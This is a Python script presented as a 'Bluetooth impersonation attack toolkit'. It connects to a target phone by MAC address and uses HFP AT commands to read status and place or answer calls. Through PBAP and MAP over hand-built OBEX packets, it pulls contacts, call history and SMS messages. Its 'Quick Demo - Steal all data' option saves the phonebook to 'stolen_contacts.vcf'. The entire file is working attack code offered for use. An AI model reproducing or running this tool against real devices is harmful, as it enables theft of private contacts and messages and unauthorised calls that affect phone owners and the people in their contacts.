#!/usr/bin/env python3
"""
Bluetooth Impersonation Attack Demo
Supports HFP (calls), PBAP (contacts), and MAP (messages)
"""
import socket
import sys
import time
import subprocess
import re


class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


def print_banner():
    print(f"{Colors.HEADER}")
    print("=" * 60)
    print("  BLUETOOTH IMPERSONATION ATTACK TOOLKIT")
    print("  HFP | PBAP | MAP Access via Spoofed Device")
    print("=" * 60)
    print(f"{Colors.ENDC}\n")


def discover_channels(mac_address):
    print(f"{Colors.OKCYAN}[*] Discovering services on {mac_address}...{Colors.ENDC}")
    result = subprocess.run(["sdptool", "browse", mac_address], capture_output=True, text=True)

    channels = {'hfp': 4, 'pbap': 19, 'map': [26]}
    current_service = None

    for line in result.stdout.splitlines():
        if 'Handsfree Audio Gateway' in line or 'Handsfree Gateway' in line:
            current_service = 'hfp'
        elif 'Phonebook Access' in line or 'OBEX Phonebook' in line:
            current_service = 'pbap'
        elif 'SMS/MMS' in line or ('Message Access' in line and 'MAS' in line):
            current_service = 'map' 

        if current_service:
            m = re.search(r'Channel:\s*(\d+)', line)
            if m:
                ch = int(m.group(1))
                if current_service == 'map':
                    channels['map'].append(ch)
                else:
                    channels[current_service] = ch
                print(f"{Colors.OKGREEN}[+] {current_service.upper()} on channel {ch}{Colors.ENDC}")
                current_service = None
    return channels


# ============= HFP =============

def send_at_command(sock, cmd, description=""):
    if description:
        print(f"{Colors.OKCYAN}[*] {description}{Colors.ENDC}")
    sock.send(f"{cmd}\r\n".encode())
    time.sleep(0.5)
    response = sock.recv(4096).decode('utf-8', errors='ignore')
    print(f"{Colors.OKBLUE}{response.strip()}{Colors.ENDC}")
    return response


def hfp_menu(mac_address, channel=4):
    print(f"\n{Colors.HEADER}=== HFP (Hands-Free Profile) ==={Colors.ENDC}")
    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
    try:
        print(f"{Colors.OKCYAN}[*] Connecting to HFP (channel {channel})...{Colors.ENDC}")
        sock.connect((mac_address, channel))
        print(f"{Colors.OKGREEN}[+] Connected!{Colors.ENDC}\n")

        send_at_command(sock, "AT+BRSF=2079",   "Exchanging features...")
        send_at_command(sock, "AT+CIND=?",       "Querying indicator format...")
        send_at_command(sock, "AT+CIND?",        "Querying indicator values...")
        send_at_command(sock, "AT+CMER=3,0,0,1", "Enabling indicator reporting...")
        send_at_command(sock, "AT+CHLD=?",       "Querying call hold support...")
        send_at_command(sock, "AT+CLIP=1",       "Enabling caller ID...")
        send_at_command(sock, "AT+CCWA=1",       "Enabling call waiting...")
        time.sleep(0.5)
        print(f"{Colors.OKGREEN}[+] SLC established{Colors.ENDC}\n")

        while True:
            print(f"\n{Colors.BOLD}HFP Commands:{Colors.ENDC}")
            print("  1. Get phone status")
            print("  2. Get carrier info")
            print("  3. Make a call")
            print("  4. Hang up call")
            print("  5. Answer call")
            print("  6. Send custom AT command")
            print("  0. Back to main menu")

            choice = input(f"\n{Colors.OKCYAN}Choice> {Colors.ENDC}").strip()

            if choice == '1':
                send_at_command(sock, "AT+CIND?", "Getting phone status...")
            elif choice == '2':
                send_at_command(sock, "AT+COPS=3,0", "Setting operator format...")
                time.sleep(0.3)
                send_at_command(sock, "AT+COPS?", "Getting carrier info...")
            elif choice == '3':
                number = input("Enter phone number: ").strip()
                send_at_command(sock, f"ATD{number};", f"Calling {number}...")
            elif choice == '4':
                send_at_command(sock, "AT+CHUP", "Hanging up...")
            elif choice == '5':
                send_at_command(sock, "ATA", "Answering call...")
            elif choice == '6':
                cmd = input("Enter AT command: ").strip()
                send_at_command(sock, cmd)
            elif choice == '0':
                break
            else:
                print(f"{Colors.FAIL}Invalid choice{Colors.ENDC}")

    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
    finally:
        sock.close()


# ============= OBEX =============

def obex_connect(sock, target_uuid=None):
    if target_uuid:
        target_header = bytes([0x46, 0x00, 0x13]) + target_uuid
        packet_len = 7 + len(target_header)
        connect = bytes([
            0x80,
            (packet_len >> 8) & 0xFF, packet_len & 0xFF,
            0x10, 0x00,
            0xFF, 0xFF
        ]) + target_header
    else:
        connect = bytes([0x80, 0x00, 0x07, 0x10, 0x00, 0xFF, 0xFF])

    sock.send(connect)
    resp = sock.recv(1024)
    print(f"[DEBUG] OBEX response: {resp.hex()}")

    if resp[0] != 0xA0:
        return None

    # Parse Connection ID (0xCB)
    conn_id = None
    i = 7
    while i < len(resp) - 4:
        if resp[i] == 0xCB:
            conn_id = (resp[i+1] << 24) | (resp[i+2] << 16) | (resp[i+3] << 8) | resp[i+4]
            break
        i += 1

    return conn_id if conn_id is not None else 0  # 0 = connected but no conn_id


def obex_disconnect(sock, conn_id=None):
    if conn_id:
        conn_hdr = bytes([0xCB,
            (conn_id >> 24) & 0xFF, (conn_id >> 16) & 0xFF,
            (conn_id >> 8) & 0xFF, conn_id & 0xFF
        ])
        pkt = bytes([0x81, 0x00, 0x03 + len(conn_hdr)]) + conn_hdr
    else:
        pkt = bytes([0x81, 0x00, 0x03])
    sock.send(pkt)
    try:
        sock.recv(1024)
    except:
        pass


def obex_setpath(sock, folder_name, conn_id=None):
    conn_hdr = b''
    if conn_id:
        conn_hdr = bytes([0xCB,
            (conn_id >> 24) & 0xFF, (conn_id >> 16) & 0xFF,
            (conn_id >> 8) & 0xFF, conn_id & 0xFF
        ])

    if folder_name == "":
        name_hdr = bytes([0x01, 0x00, 0x05, 0x00, 0x00])
        packet_len = 5 + len(conn_hdr) + len(name_hdr)
        packet = bytes([0x85, (packet_len >> 8) & 0xFF, packet_len & 0xFF, 0x02, 0x00]) + conn_hdr + name_hdr
    else:
        name_unicode = b''.join(bytes([0x00, ord(c)]) for c in folder_name) + b'\x00\x00'
        name_hdr_len = 3 + len(name_unicode)
        name_hdr = bytes([0x01, (name_hdr_len >> 8) & 0xFF, name_hdr_len & 0xFF]) + name_unicode
        packet_len = 5 + len(conn_hdr) + len(name_hdr)
        packet = bytes([0x85, (packet_len >> 8) & 0xFF, packet_len & 0xFF, 0x02, 0x00]) + conn_hdr + name_hdr

    sock.send(packet)
    resp = sock.recv(1024)
    return resp[0] == 0xA0


def obex_get(sock, type_str=None, name=None, conn_id=None):
    headers = b''

    if conn_id:
        headers += bytes([0xCB,
            (conn_id >> 24) & 0xFF, (conn_id >> 16) & 0xFF,
            (conn_id >> 8) & 0xFF, conn_id & 0xFF
        ])

    if type_str:
        type_bytes = type_str.encode('utf-8') + b'\x00'
        type_len = 3 + len(type_bytes)
        headers += bytes([0x42, (type_len >> 8) & 0xFF, type_len & 0xFF]) + type_bytes

    if name:
        name_unicode = b''.join(bytes([0x00, ord(c)]) for c in name) + b'\x00\x00'
        name_len = 3 + len(name_unicode)
        headers += bytes([0x01, (name_len >> 8) & 0xFF, name_len & 0xFF]) + name_unicode

    packet_len = 3 + len(headers)
    packet = bytes([0x83, (packet_len >> 8) & 0xFF, packet_len & 0xFF]) + headers
    sock.send(packet)

    data = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            status = data[0]
            if status == 0xA0:
                break
            elif status == 0x90:  # continue
                cont_hdrs = b''
                if conn_id:
                    cont_hdrs = bytes([0xCB,
                        (conn_id >> 24) & 0xFF, (conn_id >> 16) & 0xFF,
                        (conn_id >> 8) & 0xFF, conn_id & 0xFF
                    ])
                cont_pkt = bytes([0x83, 0x00, 0x03 + len(cont_hdrs)]) + cont_hdrs
                sock.send(cont_pkt)
                data = b''
            elif status >= 0xC0:
                print(f"{Colors.FAIL}[!] OBEX error: 0x{status:02x}{Colors.ENDC}")
                break
        except Exception as e:
            print(f"{Colors.FAIL}[!] recv error: {e}{Colors.ENDC}")
            break
    return data


def extract_vcard_data(data):
    for i in range(len(data) - 3):
        if data[i] in [0x48, 0x49]:
            return data[i+3:].decode('utf-8', errors='ignore')
    text = data.decode('utf-8', errors='ignore')
    start = text.find('BEGIN:VCARD')
    return text[start:] if start != -1 else None


# ============= PBAP =============

def pbap_menu(mac_address, channel=19):
    print(f"\n{Colors.HEADER}=== PBAP (Phone Book Access Profile) ==={Colors.ENDC}")
    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
    try:
        print(f"{Colors.OKCYAN}[*] Connecting to PBAP (channel {channel})...{Colors.ENDC}")
        sock.connect((mac_address, channel))
        print(f"{Colors.OKGREEN}[+] Connected!{Colors.ENDC}")

        PBAP_TARGET = bytes([
            0x79, 0x61, 0x35, 0xF0, 0xF0, 0xC5, 0x11, 0xD8,
            0x09, 0x66, 0x08, 0x00, 0x20, 0x0C, 0x9A, 0x66
        ])

        conn_id = obex_connect(sock, PBAP_TARGET)
        if conn_id is None:
            print(f"{Colors.FAIL}[!] OBEX handshake failed{Colors.ENDC}")
            return
        print(f"{Colors.OKGREEN}[+] OBEX handshake successful (conn_id={conn_id}){Colors.ENDC}\n")

        while True:
            print(f"\n{Colors.BOLD}PBAP Commands:{Colors.ENDC}")
            print("  1. Get all contacts (pb.vcf)")
            print("  2. Get incoming call history (ich.vcf)")
            print("  3. Get outgoing call history (och.vcf)")
            print("  4. Get missed calls (mch.vcf)")
            print("  5. Get combined call history (cch.vcf)")
            print("  0. Back to main menu")

            choice = input(f"\n{Colors.OKCYAN}Choice> {Colors.ENDC}").strip()

            if choice == '0':
                break

            files = {
                '1': ('pb.vcf',  'contacts'),
                '2': ('ich.vcf', 'incoming calls'),
                '3': ('och.vcf', 'outgoing calls'),
                '4': ('mch.vcf', 'missed calls'),
                '5': ('cch.vcf', 'combined call history')
            }

            if choice in files:
                filename, desc = files[choice]
                print(f"{Colors.OKCYAN}[*] Navigating to telecom/pb...{Colors.ENDC}")

                r1 = obex_setpath(sock, "", conn_id)
                r2 = obex_setpath(sock, "telecom", conn_id)

                print(f"{Colors.OKCYAN}[*] Getting {desc}...{Colors.ENDC}")
                data = obex_get(sock,type_str="x-bt/phonebook", name=filename, conn_id=conn_id)
                vcards = extract_vcard_data(data)

                if vcards:
                    print(f"\n{Colors.OKGREEN}=== {desc.upper()} ==={Colors.ENDC}")
                    print(vcards[:2000])
                    if len(vcards) > 2000:
                        print(f"\n{Colors.WARNING}[...truncated, {len(vcards)} total chars]{Colors.ENDC}")
                    save = input(f"\n{Colors.OKCYAN}Save to file? (y/n): {Colors.ENDC}").lower()
                    if save == 'y':
                        with open(filename, 'w') as f:
                            f.write(vcards)
                        print(f"{Colors.OKGREEN}[+] Saved to {filename}{Colors.ENDC}")
                else:
                    print(f"{Colors.WARNING}[!] No data received{Colors.ENDC}")
                    print(f"Raw: {data[:100].hex()}")

                obex_setpath(sock, "", conn_id)  # back to root
            else:
                print(f"{Colors.FAIL}Invalid choice{Colors.ENDC}")

    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
        import traceback; traceback.print_exc()
    finally:
        try:
            obex_disconnect(sock, conn_id)
        except:
            pass
        sock.close()


# ============= MAP =============

def map_menu(mac_address, channels):
    print(f"\n{Colors.HEADER}=== MAP (Message Access Profile) ==={Colors.ENDC}")
    print(f"\nAvailable MAP channels: {channels}")
    channel = input(f"{Colors.OKCYAN}Select channel> {Colors.ENDC}").strip()
    try:
        channel = int(channel)
    except:
        print(f"{Colors.FAIL}Invalid channel{Colors.ENDC}")
        return

    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
    try:
        print(f"{Colors.OKCYAN}[*] Connecting to MAP (channel {channel})...{Colors.ENDC}")
        sock.connect((mac_address, channel))
        print(f"{Colors.OKGREEN}[+] Connected!{Colors.ENDC}")

        MAP_TARGET = bytes([
            0xbb, 0x58, 0x2b, 0x40, 0x42, 0x0c, 0x11, 0xdb,
            0xb0, 0xde, 0x08, 0x00, 0x20, 0x0c, 0x9a, 0x66
        ])



        conn_id = obex_connect(sock, MAP_TARGET)
        if conn_id is None:
            print(f"{Colors.FAIL}[!] OBEX handshake failed{Colors.ENDC}")
            return
        print(f"{Colors.OKGREEN}[+] OBEX handshake successful (conn_id={conn_id}){Colors.ENDC}\n")

        while True:
            print(f"\n{Colors.BOLD}MAP Commands:{Colors.ENDC}")
            print("  1. List root folders")
            print("  2. List messages in inbox")
            print("  3. Get message by handle")
            print("  0. Back to main menu")

            choice = input(f"\n{Colors.OKCYAN}Choice> {Colors.ENDC}").strip()

            if choice == '0':
                break

            elif choice == '1':
                print(f"{Colors.OKCYAN}[*] Getting folder listing...{Colors.ENDC}")
                data = obex_get(sock, type_str='x-obex/folder-listing', conn_id=conn_id)
                text = data.decode('utf-8', errors='ignore')
                start = text.find('<')
                if start != -1:
                    print(f"{Colors.OKGREEN}{text[start:]}{Colors.ENDC}")
                else:
                    print(f"Raw: {data[:200].hex()}")

            elif choice == '2':
                print(f"{Colors.OKCYAN}[*] Navigating to telecom/msg/inbox...{Colors.ENDC}")
                obex_setpath(sock, "telecom", conn_id)
                obex_setpath(sock, "msg",     conn_id)
                obex_setpath(sock, "inbox",   conn_id)
                print(f"{Colors.OKCYAN}[*] Getting messages listing...{Colors.ENDC}")
                data = obex_get(sock, type_str='x-bt/MAP-msg-listing', conn_id=conn_id)
                text = data.decode('utf-8', errors='ignore')
                start = text.find('<')
                if start != -1:
                    print(f"{Colors.OKGREEN}{text[start:]}{Colors.ENDC}")
                else:
                    print(f"Raw: {data[:200].hex()}")
                obex_setpath(sock, "", conn_id)  # back to root

            elif choice == '3':
                handle = input("Enter message handle (hex): ").strip()
                print(f"{Colors.OKCYAN}[*] Getting message {handle}...{Colors.ENDC}")
                data = obex_get(sock, type_str='x-bt/message', name=handle, conn_id=conn_id)
                text = data.decode('utf-8', errors='ignore')
                start = text.find('BEGIN:BMSG')
                if start != -1:
                    print(f"{Colors.OKGREEN}{text[start:]}{Colors.ENDC}")
                else:
                    print(f"Raw: {data[:200].hex()}")

    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
        import traceback; traceback.print_exc()
    finally:
        try:
            obex_disconnect(sock, conn_id)
        except:
            pass
        sock.close()


# ============= Quick Demo =============

def quick_demo(mac_address, channels):
    print(f"\n{Colors.WARNING}=== QUICK DEMO - Data Extraction ==={Colors.ENDC}\n")

    print(f"{Colors.HEADER}[1/2] HFP - Phone Status{Colors.ENDC}")
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
        sock.connect((mac_address, channels['hfp']))
        send_at_command(sock, "AT+BRSF=2079")
        send_at_command(sock, "AT+CIND=?")
        send_at_command(sock, "AT+CIND?",        "Phone status:")
        send_at_command(sock, "AT+CMER=3,0,0,1")
        send_at_command(sock, "AT+CHLD=?")
        send_at_command(sock, "AT+COPS=3,0")
        time.sleep(0.3)
        send_at_command(sock, "AT+COPS?", "Carrier:")
        sock.close()
    except Exception as e:
        print(f"{Colors.FAIL}HFP failed: {e}{Colors.ENDC}")

    print(f"\n{Colors.HEADER}[2/2] PBAP - Full Phonebook{Colors.ENDC}")
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
        sock.connect((mac_address, channels['pbap']))

        PBAP_TARGET = bytes([
            0x79, 0x61, 0x35, 0xF0, 0xF0, 0xC5, 0x11, 0xD8,
            0x09, 0x66, 0x08, 0x00, 0x20, 0x0C, 0x9A, 0x66
        ])

        conn_id = obex_connect(sock, PBAP_TARGET)
        if conn_id is not None:
            obex_setpath(sock, "", conn_id)
            obex_setpath(sock, "telecom", conn_id)
            obex_setpath(sock, "pb", conn_id)
            data = obex_get(sock, name="pb.vcf", conn_id=conn_id)
            vcards = extract_vcard_data(data)
            if vcards:
                with open("stolen_contacts.vcf", "w") as f:
                    f.write(vcards)
                count = vcards.count("BEGIN:VCARD")
                print(f"{Colors.OKGREEN}[+] Extracted {count} contacts -> stolen_contacts.vcf{Colors.ENDC}")
            else:
                print(f"{Colors.WARNING}[!] No vCard data{Colors.ENDC}")
        obex_disconnect(sock, conn_id)
        sock.close()
    except Exception as e:
        print(f"{Colors.FAIL}PBAP failed: {e}{Colors.ENDC}")

    print(f"\n{Colors.OKGREEN}=== Demo Complete ==={Colors.ENDC}")


# ============= Main =============

def main_menu(mac_address):
    print_banner()
    print(f"{Colors.OKGREEN}Target: {mac_address}{Colors.ENDC}\n")
    channels = discover_channels(mac_address)

    while True:
        print(f"\n{Colors.BOLD}Main Menu:{Colors.ENDC}")
        print(f"  1. HFP  - Hands-Free (channel {channels['hfp']})")
        print(f"  2. PBAP - Phone Book Access (channel {channels['pbap']})")
        print(f"  3. MAP  - Message Access (channel {channels['map']})")
        print("  4. Quick Demo - Steal all data")
        print("  0. Exit")

        choice = input(f"\n{Colors.OKCYAN}Choice> {Colors.ENDC}").strip()

        if choice == '1':
            hfp_menu(mac_address, channels['hfp'])
        elif choice == '2':
            pbap_menu(mac_address, channels['pbap'])
        elif choice == '3':
            map_menu(mac_address, channels['map'])
        elif choice == '4':
            quick_demo(mac_address, channels)
        elif choice == '0':
            print(f"\n{Colors.OKCYAN}Goodbye!{Colors.ENDC}")
            break
        else:
            print(f"{Colors.FAIL}Invalid choice{Colors.ENDC}")


def main():
    if len(sys.argv) < 2:
        print("Usage: sudo python3 bt_attack.py <MAC_ADDRESS>")
        sys.exit(1)
    mac_address = sys.argv[1]
    try:
        main_menu(mac_address)
    except KeyboardInterrupt:
        print(f"\n\n{Colors.OKCYAN}Interrupted{Colors.ENDC}")
    except Exception as e:
        print(f"\n{Colors.FAIL}Fatal error: {e}{Colors.ENDC}")
        import traceback; traceback.print_exc()

if __name__ == "__main__":
    main()
